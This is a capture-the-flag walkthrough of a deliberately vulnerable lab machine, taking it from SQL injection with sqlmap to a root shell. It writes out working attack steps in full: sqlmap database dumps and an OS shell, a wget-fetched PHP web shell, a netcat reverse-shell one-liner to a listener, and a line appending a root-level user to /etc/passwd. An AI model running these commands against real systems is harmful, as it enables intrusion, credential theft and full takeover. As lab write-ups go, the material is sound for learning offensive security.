## Nmap

![](images/ai/nmap.png)

There is only single port open and that too have some hidden directories. Let's see what else we can find from HTTP service.

***

## HTTP

When we visit the website we get a message `Not even Google search my contents!`
![](images/ai/website.png)

That message is reference to `robots.txt` because that is the file use to allow or disallow google from scraping.

In `robots.txt` we have 2 entries `/m3diNf0/`, `/se3reTdir777/uploads/`.

![](images/ai/robots.png)

But When I tried visiting `/m3diNf0/` or `/se3reTdir777/uploads/` I got `403` Forbidden error, meaning I cannot view the content of those page.
I ran dirsearch on `/m3diNf0/` and found `info.php`

![](images/ai/dirsearch.png)

If we open that `info.php` it contains simple information about the system.
But when I opened the `http://192.168.184.135/se3reTdir777/` I got a very basic form asking me about `UserID`.

![](images/ai/form.png)

I started to submit id as `1,2,3...`

![](images/ai/id3.png)

When I submitted UserId as `4` I got error.

## sqlmap

I tested this field for SQLi with `sqlmap`. I captured the requests and saved it in a file named `sql.txt` and then passed that file to sqlmap.

* `➜ sqlmap -r /home/mzfr/sql.txt --dbs`

![](images/ai/dbs.png)

* `➜ sqlmap -r /home/mzfr/sql.txt -D aiweb1 --tables`

![](images/ai/tables.png)

* `➜ sqlmap -r /home/mzfr/sql.txt -D aiweb1 --dump`

![](images/ai/hash.png)

Since all the hashes are just base64 encoded so I decoded them and only one of them was legit.

![](images/ai/password.png)

`aiweb1pwn:MyEvilPass_f908sdaf9_sadfasf0sa`

but since there is no service to login we can't use this.

I found out that we can use `--os-shell` with sqlmap to get the shell.

I ran
`sqlmap -r /home/mzfr/sql.txt -D aiweb1 --os-shell` and then selected following options:

![](images/ai/options.png)

I figured out that custom path from the `info.php` we found in the starting.

![](images/ai/right-path.png)

And with that I got the shell.

![](images/ai/os-shell.png)

From this I uploaded a `phpbash` shell using `wget`

![](images/ai/wget.png)

Now we can visit `se3reTdir777/uploads/phpbash.php` and we'll have a phpbash shell.

![](images/ai/phpbash.png)

So Now from this shell I ran

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.184.1 4444 >/tmp/f
```

## Privilege escalation

I downloaded the enumeration script and ran it and I found out that there are two users `aiweb1` and `aiweb1pwn`

![](images/ai/users.png)

I ran `find / -user www-data -type f 2>/dev/null` and found that `www-data` can edit `/etc/passwd` which is nice.

I ran `echo "toor:sXuCKi7k3Xh/s:0:0::/root:/bin/bash" >> /etc/passwd` this will add a new user named `toor` with  password `toor` having `root` access.

Then I `su` to toor and got the root-shell.

![](images/ai/root-shell.png)

now get the flag from the root directory.

This was an awesome machine with something new for me. I didn't knew that we can use sqlmap for getting a shell.

Thanks to [@arif_xpress](https://twitter.com/@arif_xpress) for making this machine.
